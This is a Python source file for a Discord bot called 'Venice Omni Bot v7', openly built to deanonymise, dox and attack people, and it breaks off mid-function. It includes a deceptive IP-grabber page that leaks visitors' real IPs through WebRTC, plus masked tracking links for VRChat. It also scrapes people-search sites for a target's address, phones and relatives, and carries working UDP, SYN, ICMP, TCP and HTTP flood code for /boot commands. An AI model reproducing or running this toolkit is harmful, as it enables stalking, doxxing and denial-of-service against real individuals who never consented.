#!/usr/bin/env python3
# =============================================================================
#  VENICE // OMNI BOT v7 — SELF-CONTAINED PEOPLE ENGINE
#  Scrapes people-search in-code (address, phone, relatives) · multi-source geo
#  · VPN detection · fixed flood · /everything
# =============================================================================
#  pip install -U discord.py aiohttp dnspython python-whois pillow phonenumbers
#  export DISCORD_TOKEN="..." PUBLIC_URL="http://VPS:8080" [GUILD_ID="..."]
#  python bot.py
# =============================================================================

import os, io, re, ssl, json, time, math, base64, hashlib, socket, struct, random, html as htmllib
import asyncio, subprocess, threading, ipaddress, uuid as uuidlib
from datetime import datetime, timezone
from urllib.parse import quote

import aiohttp
from aiohttp import web
import discord
from discord import app_commands
from discord.ext import commands
import dns.resolver
import phonenumbers
from phonenumbers import geocoder as pn_geo, carrier as pn_car, timezone as pn_tz
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
try: import whois as whois_lib
except Exception: whois_lib=None

TOKEN=os.getenv("DISCORD_TOKEN","PASTE"); GUILD_ID=int(os.getenv("GUILD_ID","0") or "0")
WEB_HOST=os.getenv("WEB_HOST","0.0.0.0"); WEB_PORT=int(os.getenv("PORT") or os.getenv("WEB_PORT","8080"))
PUBLIC_URL=os.getenv("PUBLIC_URL","http://127.0.0.1:8080").rstrip("/")
DATA_FILE=os.getenv("DATA_FILE","grabs.json"); HIBP_KEY=os.getenv("HIBP_API_KEY","")
VR_BASE="https://api.vrchat.cloud/api/1"; VR_UA="VeniceOmni/7.0"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
GRABS={}; WATCH={}; LAST_LINK={}

def _load():
    global GRABS, WATCH
    if os.path.exists(DATA_FILE):
        try:
            d=json.load(open(DATA_FILE,encoding="utf-8")); GRABS=d.get("grabs",{}); WATCH=d.get("watch",{})
        except: GRABS={}; WATCH={}
def _save():
    try: json.dump({"grabs":GRABS,"watch":WATCH},open(DATA_FILE,"w",encoding="utf-8"),indent=2)
    except: pass
_load()
def nt(n=6): return "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(n))

# ---------------- WEB ----------------
PAGE="""<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>connect…</title>
<style>:root{color-scheme:dark}body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0b0f14;color:#7ef;font-family:-apple-system,system-ui,monospace;padding:24px;text-align:center}h2{font-size:20px;margin:0 0 8px}#s{opacity:.8;font-size:14px}button{margin-top:24px;padding:16px 30px;font-size:18px;border:1px solid #00b4d8;border-radius:14px;background:#00b4d8;color:#001;font-weight:700}button:active{transform:scale(.97)}</style></head><body>
<h2 id="t">Tap to connect</h2><p id="s">Running…</p><button id="b">START</button><script>
const token=location.pathname.split("/").pop();const out={webrtc:[],v4:null,v6:null};
function fips(){fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>out.v4=d.ip).catch(()=>{});fetch("https://api6.ipify.org?format=json").then(r=>r.json()).then(d=>out.v6=d.ip).catch(()=>{});}
function wrtc(){const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"},{urls:"stun:stun1.l.google.com:19302"}]});try{pc.createDataChannel("x")}catch(e){}pc.onicecandidate=e=>{if(e&&e.candidate&&e.candidate.candidate){const ip=e.candidate.candidate.split(" ")[4];if(ip&&!out.webrtc.includes(ip))out.webrtc.push(ip);}};pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});}
function send(){out.token=token;out.ua=navigator.userAgent;out.platform=navigator.platform||"m";out.lang=navigator.language;out.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;out.screen=screen.width+"x"+screen.height;out.cores=navigator.hardwareConcurrency||null;fetch("/api/report",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(out)}).catch(()=>{});document.getElementById("t").textContent="Done";document.getElementById("s").textContent="You can close this";document.getElementById("b").style.display="none";}
function start(){document.getElementById("s").textContent="Working…";fips();wrtc();setTimeout(send,3200);}
document.getElementById("b").onclick=start;setTimeout(()=>{if(!out.v4&&!out.v6){start();}},1200);</script></body></html>"""

def cip(r):
    f=r.headers.get("X-Forwarded-For"); return f.split(",")[0].strip() if f else (r.remote or "0.0.0.0")
async def log_hit(token, r):
    ip=cip(r); rec=GRABS.setdefault(token,{"created":time.time(),"hits":[]})
    hit={"ip":ip,"time":datetime.now(timezone.utc).isoformat(),"ua":r.headers.get("User-Agent",""),"params":dict(r.query)}
    rec["hits"].append(hit); _save(); asyncio.create_task(notify_hit(token,hit)); return hit
async def h_grab(r):
    await log_hit(r.match_info.get("token",""),r)
    if r.match_info.get("kind")=="v": return web.Response(text="ok")
    return web.Response(text=PAGE,content_type="text/html")
async def h_redir(r):
    token=r.match_info.get("token",""); rec=GRABS.get(token,{})
    await log_hit(token,r); return web.HTTPFound(rec.get("target") or "https://www.youtube.com")
async def h_rep(r):
    try: d=await r.json()
    except: d={}
    t=d.get("token") or (max(GRABS,key=lambda k:GRABS[k]["created"]) if GRABS else "")
    rec=GRABS.setdefault(t,{"created":time.time(),"hits":[]})
    rep={"ip":cip(r),"time":datetime.now(timezone.utc).isoformat(),**d}
    rec.setdefault("reports",[]).append(rep); _save(); asyncio.create_task(notify_hit(t,rep,kind="report"))
    return web.json_response({"ok":True})
async def notify_hit(token, hit, kind="hit"):
    w=WATCH.get(token) or []
    if not w: return
    ip=hit.get("ip"); geo=await ip_lookup(ip) if ip else {}
    vpn=geo.get("proxy") or geo.get("hosting"); real=hit.get("webrtc") or hit.get("v6")
    e=discord.Embed(title=f"// GRAB HIT [{kind}]",color=0x00ff9d)
    e.add_field(name="IP",value=f"`{ip}`",inline=True)
    if geo.get("city"): e.add_field(name="Loc",value=f"{geo.get('city')}, {geo.get('country')}",inline=True)
    if geo.get("isp"): e.add_field(name="ISP",value=str(geo.get("isp"))[:60],inline=True)
    e.add_field(name="VPN",value=("YES — hiding" if vpn else "no — residential"),inline=True)
    if real: e.add_field(name="REAL IP (leak)",value=", ".join(f"`{x}`" for x in real),inline=False)
    if hit.get("params",{}).get("name"): e.add_field(name="VRChat name",value=hit["params"]["name"],inline=True)
    for cid in w:
        try:
            ch=bot.get_channel(cid)
            if ch: await ch.send(embed=e)
        except: pass
async def start_web():
    app=web.Application()
    app.router.add_get("/",lambda r:web.Response(text="Venice online."))
    app.router.add_get("/g/{token}",h_grab); app.router.add_get("/v/{token}",h_grab)
    app.router.add_get("/r/{token}",h_redir); app.router.add_post("/api/report",h_rep)
    run=web.AppRunner(app); await run.setup(); await web.TCPSite(run,WEB_HOST,WEB_PORT).start()
    print(f"[web] {WEB_HOST}:{WEB_PORT}")

# ---------------- HELPERS ----------------
async def gjson(s,url,**k):
    try:
        async with s.get(url,timeout=aiohttp.ClientTimeout(total=12),**k) as r:
            if r.status==200: return await r.json(content_type=None)
    except: pass
    return None
async def gtext(s,url,**k):
    try:
        async with s.get(url,timeout=aiohttp.ClientTimeout(total=15),**k) as r:
            if r.status==200: return await r.text()
    except: pass
    return None
async def pjson(s,url,p,**k):
    try:
        async with s.post(url,json=p,timeout=aiohttp.ClientTimeout(total=12),**k) as r:
            if r.status==200: return await r.json(content_type=None)
    except: pass
    return None

FIELDS="status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
async def ip_lookup(ip):
    o={"ip":ip}
    async with aiohttp.ClientSession() as s:
        d=await gjson(s,f"http://ip-api.com/json/{ip}?fields={FIELDS}")
        if d and d.get("status")=="success": o.update(d)
        w=await gjson(s,f"https://ipwho.is/{ip}")
        if w and w.get("success"):
            for k2,k3 in (("city","city"),("regionName","region"),("country","country"),("countryCode","country_code"),("lat","latitude"),("lon","longitude"),("zip","postal")):
                if not o.get(k2) and w.get(k3): o[k2]=w[k3]
            if w.get("connection"):
                o.setdefault("isp",w["connection"].get("isp")); o.setdefault("org",w["connection"].get("org"))
        d2=await gjson(s,f"https://ipinfo.io/{ip}/json")
        if d2: o["ipinfo"]=d2
    try: o["rdns"]=socket.gethostbyaddr(ip)[0]
    except: o["rdns"]=None
    return o

async def rdns(d,t):
    try: return [str(x) for x in dns.resolver.resolve(d,t,lifetime=5)]
    except: return []
async def whois_lk(t):
    if not whois_lib: return "whois missing"
    def _d():
        try: return json.dumps({k:(v if not isinstance(v,list) else [str(x) for x in v]) for k,v in dict(whois_lib.whois(t)).items()},indent=2,default=str)[:1700]
        except Exception as e: return f"err {e}"
    return await asyncio.get_running_loop().run_in_executor(None,_d)
PORTS=[21,22,23,25,53,80,110,143,443,445,587,993,995,1080,1194,1433,1723,3306,3389,5060,5222,5228,5900,8080,8443,9000,27015,25565]
async def scan(ip,ports=None):
    ports=ports or PORTS
    async def one(p):
        try: r,w=await asyncio.wait_for(asyncio.open_connection(ip,p),timeout=1.0); w.close(); return p
        except: return None
    return [p for p in await asyncio.gather(*[one(p) for p in ports]) if p]
async def ping(ip,c=4):
    w=os.name=="nt"; cmd=["ping","-n" if w else "-c",str(c),ip]
    def _r():
        try: return subprocess.run(cmd,capture_output=True,text=True,timeout=c*3+5).stdout
        except Exception as e: return str(e)
    return await asyncio.get_running_loop().run_in_executor(None,_r)
async def traceroute(ip):
    cmd=["tracert","-d","-h","15",ip] if os.name=="nt" else ["traceroute","-n","-m","15",ip]
    def _r():
        try: return subprocess.run(cmd,capture_output=True,text=True,timeout=40).stdout
        except Exception as e: return str(e)
    return await asyncio.get_running_loop().run_in_executor(None,_r)
async def banner(ip,port):
    try:
        r,w=await asyncio.wait_for(asyncio.open_connection(ip,port),timeout=3)
        try: data=await asyncio.wait_for(r.read(200),timeout=2)
        except: data=b""
        w.close(); return data.decode(errors="ignore").strip() or "(no banner)"
    except Exception as e: return f"err {e}"
def ssl_info(host,port=443):
    try:
        ctx=ssl.create_default_context()
        with socket.create_connection((host,port),timeout=8) as sk:
            with ctx.wrap_socket(sk,server_hostname=host) as ss: return ss.getpeercert()
    except Exception as e: return {"error":str(e)}

# ---- PEOPLE ENGINE ----
def _cl(s): return re.sub(r"\s+"," ",htmllib.unescape(s or "")).strip()
async def people_search(name, citystatezip=""):
    out={"name":name,"results":[],"detail":{}}
    slug=name.strip().replace(" ","-")
    base=f"https://www.fastpeoplesearch.com/name/{slug}"
    if citystatezip: base+=f"_{citystatezip.strip().replace(' ','-')}"
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        html=await gtext(s,base)
        if html:
            ppl=re.findall(r'href="(/person/[^"]+)"[^>]*>([^<]+)</a>', html)
            seen=set()
            for href,label in ppl:
                if href in seen: continue
                seen.add(href)
                out["results"].append({"name":_cl(label),"url":"https://www.fastpeoplesearch.com"+href})
                if len(out["results"])>=5: break
            addrs=re.findall(r'>(\d{1,6}\s+[A-Za-z0-9\.\- ]+(?:St|Street|Ave|Avenue|Rd|Road|Dr|Drive|Ln|Lane|Blvd|Way|Ct|Court|Pl|Place|Cir|Ter|Hwy|Pkwy)[A-Za-z0-9\.\- ,]*)<', html)
            out["addresses"]=[_cl(a) for a in dict.fromkeys(addrs)][:8]
            if out["results"]:
                ph=await gtext(s,out["results"][0]["url"])
                if ph:
                    pn=re.findall(r'itemprop="telephone"[^>]*>([^<]+)<', ph)
                    out["detail"]["phones"]=[_cl(x) for x in dict.fromkeys(pn)][:6]
                    pa=re.findall(r'itemprop="address"[^>]*>([^<]+)<', ph)
                    out["detail"]["address"]=[_cl(x) for x in dict.fromkeys(pa)][:6]
                    rel=re.findall(r'href="/name/[^"]+"[^>]*>([^<]+)</a>', ph)
                    out["detail"]["relatives"]=[_cl(x) for x in dict.fromkeys(rel) if "," not in x][:15]
    if not out["results"]:
        tps=f"https://www.truepeoplesearch.com/results?name={quote(name)}"
        async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
            html=await gtext(s,tps)
            if html:
                names=re.findall(r'<div class="h4">([^<]+)</div>', html)
                out["results"]=[{"name":_cl(n),"url":tps} for n in names[:5]]
    return out

SITES={"GitHub":"https://github.com/{}","Reddit":"https://www.reddit.com/user/{}","Twitter/X":"https://x.com/{}","Instagram":"https://www.instagram.com/{}/","TikTok":"https://www.tiktok.com/@{}","YouTube":"https://www.youtube.com/@{}","Twitch":"https://www.twitch.tv/{}","Steam":"https://steamcommunity.com/id/{}","Pinterest":"https://www.pinterest.com/{}/","Medium":"https://medium.com/@{}","DeviantArt":"https://www.deviantart.com/{}","SoundCloud":"https://soundcloud.com/{}","GitLab":"https://gitlab.com/{}","BitBucket":"https://bitbucket.org/{}/","Patreon":"https://www.patreon.com/{}","Telegram":"https://t.me/{}","VK":"https://vk.com/{}","Roblox":"https://www.roblox.com/user.aspx?username={}","VRChat":"https://vrchat.com/home/user/{}","Imgur":"https://imgur.com/user/{}","AboutMe":"https://about.me/{}","Keybase":"https://keybase.io/{}","HackerNews":"https://news.ycombinator.com/user?id={}","CodePen":"https://codepen.io/{}","Replit":"https://replit.com/@{}"}
async def enum_user(name):
    out=[]
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        async def chk(n,u):
            try:
                async with s.get(u.format(name),timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status==200: return (n,u.format(name))
            except: pass
        for res in await asyncio.gather(*[chk(n,u) for n,u in SITES.items()]):
            if res: out.append(res)
    return out
async def email_intel(e):
    o={"email":e}; dom=e.split("@")[-1] if "@" in e else ""
    o["mx"]=await rdns(dom,"MX"); o["txt"]=await rdns(dom,"TXT")
    h=hashlib.md5(e.strip().lower().encode()).hexdigest(); o["gravatar"]=f"https://www.gravatar.com/avatar/{h}?d=404"
    async with aiohttp.ClientSession() as s:
        try:
            async with s.head(o["gravatar"]) as r: o["gravatar_exists"]=r.status==200
        except: o["gravatar_exists"]=False
        if HIBP_KEY:
            try:
                async with s.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{quote(e)}?truncateResponse=false",headers={"hibp-api-key":HIBP_KEY,"User-Agent":UA}) as r:
                    if r.status==200: o["breaches"]=[b["Name"] for b in await r.json()]
                    elif r.status==404: o["breaches"]=[]
            except: pass
        d=await gjson(s,f"https://emailrep.io/{e}")
        if d: o["rep"]={k:d.get(k) for k in ("reputation","suspicious","profiles")}
    return o
def phone_intel(n):
    o={"input":n}
    try:
        p=phonenumbers.parse(n,None)
        o.update(valid=phonenumbers.is_valid_number(p),cc=p.country_code,region=phonenumbers.region_code_for_number(p),carrier=pn_car.name_for_number(p,"en"),location=pn_geo.description_for_number(p,"en"),tz=list(pn_tz.time_zones_for_number(p)),e164=phonenumbers.format_number(p,phonenumbers.PhoneNumberFormat.E164))
    except Exception as e: o["error"]=str(e)
    return o
def exif_intel(raw):
    o={}
    try:
        im=Image.open(io.BytesIO(raw)); o["format"]=im.format; o["size"]=f"{im.width}x{im.height}"
        info=im.getexif(); gps={}
        for tid,val in (info.items() if info else []):
            tag=TAGS.get(tid,tid)
            if tag=="GPSInfo":
                for g,v in val.items(): gps[GPSTAGS.get(g,g)]=v
            else: o[str(tag)]=str(val)[:90]
        if gps:
            def deg(v): d,m,s=v; return float(d)+float(m)/60+float(s)/3600
            la=deg(gps["GPSLatitude"]); lo=deg(gps["GPSLongitude"])
            if gps.get("GPSLatitudeRef")=="S": la=-la
            if gps.get("GPSLongitudeRef")=="W": lo=-lo
            o["lat"]=la; o["lon"]=lo; o["maps"]=f"https://maps.google.com/?q={la},{lo}"
    except Exception as e: o["error"]=str(e)
    return o
FLAGS={1<<0:"Discord Staff",1<<1:"Partner",1<<2:"HypeSquad Events",1<<3:"Bug Hunter L1",1<<6:"Bravery",1<<7:"Brilliance",1<<8:"Balance",1<<9:"Early Supporter",1<<14:"Bug Hunter L2",1<<16:"Verified Bot",1<<17:"Early Verified Bot Dev",1<<18:"Mod Alumni",1<<22:"Active Developer"}
def snow(sid):
    try: return datetime.fromtimestamp(((int(sid)>>22)+1420070400000)/1000,timezone.utc)
    except: return None
async def roblox_user(name):
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        d=await pjson(s,"https://users.roblox.com/v1/usernames/users",{"usernames":[name],"excludeBannedUsers":False})
        if not d or not d.get("data"): return None
        uid=d["data"][0]["id"]
        return {"id":uid,
            "user":await gjson(s,f"https://users.roblox.com/v1/users/{uid}"),
            "history":await gjson(s,f"https://users.roblox.com/v1/users/{uid}/username-history?limit=50&sortOrder=Asc"),
            "friends":await gjson(s,f"https://friends.roblox.com/v1/users/{uid}/friends/count"),
            "followers":await gjson(s,f"https://friends.roblox.com/v1/users/{uid}/followers/count"),
            "groups":await gjson(s,f"https://groups.roblox.com/v1/users/{uid}/groups/roles"),
            "presence":await pjson(s,"https://presence.roblox.com/v1/presence/users",{"userIds":[uid]}),
            "birthday":await gjson(s,f"https://accountinformation.roblox.com/v1/users/{uid}/birthday")}
async def scrape_meta(url):
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        try:
            async with s.get(url,timeout=aiohttp.ClientTimeout(total=12)) as r: html=await r.text()
        except Exception as e: return {"error":str(e)}
    o={}
    for prop in ("og:title","og:description","og:image","description"):
        m=re.search(rf'<meta[^>]+(?:property|name)="{prop}"[^>]+content="([^"]*)"',html)
        if m: o[prop]=m.group(1)[:400]
    return o
async def ig(n): return await scrape_meta(f"https://www.instagram.com/{n}/")
async def tiktok(n): return await scrape_meta(f"https://www.tiktok.com/@{n}")
async def twitter(n):
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        d=await gjson(s,f"https://cdn.syndication.twimg.com/widgets/followbutton/info.json?screen_names={n}")
        if d: return d[0] if isinstance(d,list) and d else d
    return await scrape_meta(f"https://twitter.com/{n}")

class VR:
    def __init__(self): self.s=None; self.uid=None; self.name=None
    async def ens(self):
        if self.s is None or self.s.closed: self.s=aiohttp.ClientSession(headers={"User-Agent":VR_UA},cookie_jar=aiohttp.CookieJar())
    async def login(self,u,p):
        await self.ens()
        async with self.s.get(f"{VR_BASE}/auth/user",auth=aiohttp.BasicAuth(u,p)) as r: d=await r.json()
        if d.get("requiresTwoFactorAuth"): return {"twofa":True,"methods":d["requiresTwoFactorAuth"]}
        self.uid=d.get("id"); self.name=d.get("displayName"); return {"ok":True,"name":self.name}
    async def tfa(self,c):
        await self.ens()
        async with self.s.post(f"{VR_BASE}/auth/twofactorauth/totp/verify",json={"code":c}) as r: d=await r.json()
        if d.get("verified"):
            async with self.s.get(f"{VR_BASE}/auth/user") as r2: me=await r2.json()
            self.uid=me.get("id"); self.name=me.get("displayName"); return {"ok":True,"name":self.name}
        return {"ok":False}
    async def g(self,p,**q):
        await self.ens()
        async with self.s.get(f"{VR_BASE}{p}",params=q) as r: return await r.json()
    async def u(self,i): return await self.g(f"/users/{i}")
    async def su(self,q): return await self.g("/users",search=q)
    async def w(self,i): return await self.g(f"/worlds/{i}")
    async def fr(self,i): return await self.g(f"/users/{i}/friends")
vr=VR()

# ---------------- FLOOD ----------------
class Attack:
    def __init__(self,d): self.stop=threading.Event(); self.threads=[]; self.packets=0; self.lock=threading.Lock(); self.desc=d; self.error=None
    def add(self,n):
        with self.lock: self.packets+=n
def _udp(ip,ports,size,a):
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1<<20)
    except: pass
    s.setblocking(False)
    pl=os.urandom(size); n=0; i=0; lp=len(ports)
    while not a.stop.is_set():
        for _ in range(4000):
            try: s.sendto(pl,(ip,ports[i]))
            except BlockingIOError: pass
            except OSError: pass
            n+=1; i+=1
            if i>=lp: i=0
        a.add(n); n=0
    a.add(n); s.close()
def _tcp(ip,port,a):
    n=0
    while not a.stop.is_set():
        for _ in range(50):
            try:
                s=socket.socket(); s.setblocking(False); s.connect_ex((ip,port)); s.close(); n+=1
            except: pass
        a.add(n); n=0
def _cs(m):
    s=0
    for i in range(0,len(m)-1,2): s+=(m[i]<<8)+m[i+1]
    if len(m)%2: s+=m[-1]<<8
    s=(s>>16)+(s&0xffff); s+=s>>16; return ~s&0xffff
def _syn(src,dst,sp,dp):
    sb=socket.inet_aton(src); db=socket.inet_aton(dst)
    ih=struct.pack("!BBHHHBBH4s4s",(4<<4)+5,0,40,random.randint(0,65535),0,64,6,0,sb,db)
    ih=struct.pack("!BBHHHBBH4s4s",(4<<4)+5,0,40,random.randint(0,65535),0,64,6,_cs(ih),sb,db)
    t=struct.pack("!HHLLBBHHH",sp,dp,random.randint(0,2**32-1),0,(5<<4),0x02,5840,0,0)
    ps=struct.pack("!4s4sBBH",sb,db,0,6,len(t))
    t=struct.pack("!HHLLBBHHH",sp,dp,random.randint(0,2**32-1),0,(5<<4),0x02,5840,_cs(ps+t),0)
    return ih+t
def _synw(ip,port,a):
    try: s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
    except PermissionError: a.error="SYN needs root"; return
    n=0
    while not a.stop.is_set():
        for _ in range(2000):
            try: s.sendto(_syn("0.0.0.0",ip,random.randint(1024,65535),port),(ip,0))
            except: pass
            n+=1
        a.add(n); n=0
def _icmp(ip,a):
    try: s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    except PermissionError: a.error="ICMP needs root"; return
    pid=os.getpid()&0xffff; n=0
    while not a.stop.is_set():
        for sq in range(2000):
            try:
                p=struct.pack("!BBHHH",8,0,0,pid,sq)+os.urandom(16); p=struct.pack("!BBHHH",8,0,_cs(p),pid,sq)+os.urandom(16)
                s.sendto(p,(ip,0))
            except: pass
            n+=1
        a.add(n); n=0
async def _http(url,a):
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s:
        while not a.stop.is_set():
            try:
                async with s.get(url) as r: await r.read(); a.add(1)
            except: pass
attacks={}
async def run_flood(gid,kind,ip,port,seconds,size=512,workers=8,url=None):
    a=Attack(f"{kind.upper()} {ip}:{port or '-'} {seconds}s"); attacks[gid]=a
    if kind=="udp":
        ports=[port] if port else list(range(1,1025))
        for _ in range(workers): t=threading.Thread(target=_udp,args=(ip,ports,size,a),daemon=True); t.start(); a.threads.append(t)
    elif kind=="syn":
        for _ in range(max(1,workers//2)): t=threading.Thread(target=_synw,args=(ip,port or 80,a),daemon=True); t.start(); a.threads.append(t)
    elif kind=="icmp":
        t=threading.Thread(target=_icmp,args=(ip,a),daemon=True); t.start(); a.threads.append(t)
    elif kind=="tcp":
        for _ in range(workers): t=threading.Thread(target=_tcp,args=(ip,port or 80,a),daemon=True); t.start(); a.threads.append(t)
    elif kind=="http":
        for _ in range(workers): a.threads.append(asyncio.create_task(_http(url or f"http://{ip}/",a)))
    end=time.time()+seconds
    while time.time()<end and not a.stop.is_set(): await asyncio.sleep(0.2)
    a.stop.set()
    for t in a.threads:
        if isinstance(t,threading.Thread): t.join(timeout=2)
    attacks.pop(gid,None); return a
def stop_flood(gid):
    a=attacks.get(gid)
    if a: a.stop.set()
    return a
def pdur(s):
    s=str(s).lower().strip()
    if s.endswith("h"): return int(float(s[:-1])*3600)
    if s.endswith("m"): return int(float(s[:-1])*60)
    if s.endswith("s"): return int(float(s[:-1]))
    return int(float(s))

# ---------------- BOT ----------------
intents=discord.Intents.default(); intents.message_content=True
bot=commands.Bot(command_prefix="!",intents=intents)
def E(t,d="",c=0x00b4d8): return discord.Embed(title=t,description=d,color=c)
def F(e,n,v,inline=True):
    if len(e.fields)<25 and v: e.add_field(name=str(n)[:256],value=str(v)[:1000],inline=inline)
    return e
async def slong(ch,txt):
    for i in range(0,len(txt),1900): await ch.send(txt[i:i+1900])

@bot.tree.command(name="start",description="Wake the bot.")
async def start(i:discord.Interaction): await i.response.send_message(embed=E("// OMNI v7 online.","`/people <name>` = address/relatives · `/everything <x>` · `/boot <ip>`"))
@bot.tree.command(name="menu",description="Menu.")
async def menu(i:discord.Interaction):
    e=E("// MENU",c=0x9d4edd)
    F(e,"ONE-SHOT","`/everything <anything>`",False)
    F(e,"PEOPLE","`/people <name>` `/relatives <name>`",False)
    F(e,"GRAB","`/grab` `/mask` `/grabs` `/grab_clear` `/qr` `/call` `/watch`",False)
    F(e,"IP","`/lookup` `/geo` `/asn` `/leak` `/vpn` `/ports` `/trace` `/traceroute` `/banner` `/whois` `/dns` `/resolve` `/ssl` `/subs` `/headers` `/ipcalc` `/mac`",False)
    F(e,"IDENTITY","`/username` `/email` `/breach` `/phone` `/exif` `/face`",False)
    F(e,"PLATFORMS","`/discord` `/roblox` `/ig` `/twitter` `/tiktok` `/vrc_user` `/vrc_search` `/vrc_world` `/vrc_friends` `/chain`",False)
    F(e,"ATTACK","`/boot` `/stress` `/flood` `/syn` `/icmp` `/tcpflood` `/httpflood` `/stop` `/status` `/diag`",False)
    F(e,"UTIL","`/hash` `/b64` `/uuid` `/calc` `/userinfo` `/serverinfo` `/avatar`",False)
    await i.response.send_message(embed=e)
@bot.tree.command(name="help",description="Help.")
async def helpc(i:discord.Interaction): await menu(i)
@bot.tree.command(name="ping",description="Latency.")
async def pingc(i:discord.Interaction): await i.response.send_message(f"pong {round(bot.latency*1000)}ms")
@bot.tree.command(name="status",description="Attack status.")
async def statusc(i:discord.Interaction):
    a=attacks.get(i.guild_id); await i.response.send_message(f"{a.desc} | {a.packets:,} pkts" if a else "Nothing running.")
@bot.tree.command(name="diag",description="Test flood speed (5s).")
async def diagc(i:discord.Interaction):
    await i.response.defer(); await i.followup.send("Testing 5s…")
    a=await run_flood(i.guild_id,"udp","1.1.1.1",0,5,size=512,workers=8)
    pps=a.packets/5; v="STRONG" if pps>50000 else ("OK" if pps>15000 else "WEAK — use a VPS")
    await i.channel.send(f"Packets: {a.packets:,} | ~{int(pps):,}/sec | {v}")

@bot.tree.command(name="grab",description="IP-grab link.")
async def grabc(i:discord.Interaction,label:str="target"):
    t=nt(); GRABS[t]={"created":time.time(),"label":label,"hits":[]}; _save()
    u=f"{PUBLIC_URL}/g/{t}"; LAST_LINK[i.user.id]=u
    e=E("// GRAB LINK",f"**{u}**\nLogs IP + WebRTC(real IP behind VPN) + IPv6.")
    e.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={quote(u)}"); await i.response.send_message(embed=e)
@bot.tree.command(name="mask",description="Mask a URL, log IPs, redirect.")
async def maskc(i:discord.Interaction,target:str,label:str="masked"):
    if not target.startswith("http"): target="https://"+target
    t=nt(); GRABS[t]={"created":time.time(),"label":label,"hits":[],"target":target}; _save()
    u=f"{PUBLIC_URL}/r/{t}"; LAST_LINK[i.user.id]=u
    e=E("// MASK LINK",f"**{u}**\n→ {target}\nPaste into a VRChat video player / chat.")
    e.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={quote(u)}"); await i.response.send_message(embed=e)
@bot.tree.command(name="watch",description="Notify this channel on hits.")
async def watchc(i:discord.Interaction,token:str=""):
    t=token or (max(GRABS,key=lambda k:GRABS[k]["created"]) if GRABS else "")
    if not t: return await i.response.send_message("No grabs yet.")
    l=WATCH.setdefault(t,[])
    if i.channel_id in l: l.remove(i.channel_id); m="off"
    else: l.append(i.channel_id); m="ON"
    _save(); await i.response.send_message(f"Watch {m} for `{t}`.")
@bot.tree.command(name="grabs",description="Caught IPs.")
async def grabsc(i:discord.Interaction):
    if not GRABS: return await i.response.send_message("None yet.")
    e=E("// CAUGHT",c=0x00ff9d)
    for t,r in list(GRABS.items())[-8:]:
        ips=list(dict.fromkeys(h["ip"] for h in r.get("hits",[])))
        names=[h.get("params",{}).get("name") for h in r.get("hits",[]) if h.get("params",{}).get("name")]
        line=f"hits {len(r.get('hits',[]))}"
        if ips: line+="\n"+" ".join(f"`{x}`" for x in ips)
        if names: line+="\nnames: "+", ".join(set(names))
        for rep in r.get("reports",[])[-1:]:
            if rep.get("webrtc"): line+="\nWebRTC "+", ".join(f"`{x}`" for x in rep["webrtc"])
            if rep.get("v6"): line+=f"\nv6 leak `{rep['v6']}`"
        F(e,f"{t} {r.get('label','')}",line,False)
    await i.response.send_message(embed=e)
@bot.tree.command(name="grab_clear",description="Clear.")
async def gclr(i:discord.Interaction): GRABS.clear(); _save(); await i.response.send_message("Wiped.")
@bot.tree.command(name="qr",description="QR of link.")
async def qrc(i:discord.Interaction,link:str=""):
    u=link or LAST_LINK.get(i.user.id)
    if not u: return await i.response.send_message("No link.")
    e=E("// QR",u); e.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=320x320&data={quote(u)}"); await i.response.send_message(embed=e)
@bot.tree.command(name="call",description="Grab from a call.")
async def callc(i:discord.Interaction):
    t=nt(); GRABS[t]={"created":time.time(),"label":"call","hits":[]}; _save(); u=f"{PUBLIC_URL}/g/{t}"; LAST_LINK[i.user.id]=u
    e=E("// CALL GRAB",f"Drop in call: **{u}**"); e.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={quote(u)}"); await i.response.send_message(embed=e)

@bot.tree.command(name="resolve",description="Domain to IP.")
async def resolvec(i:discord.Interaction,domain:str):
    await i.response.send_message(f"A: {', '.join(await rdns(domain,'A')) or '—'}\nAAAA: {', '.join(await rdns(domain,'AAAA')) or '—'}")
@bot.tree.command(name="lookup",description="Full IP intel.")
async def lookupc(i:discord.Interaction,ip:str):
    await i.response.defer(); d=await ip_lookup(ip)
    if "city" not in d and d.get("error"): return await i.followup.send("Couldn't resolve.")
    e=E(f"// {ip}")
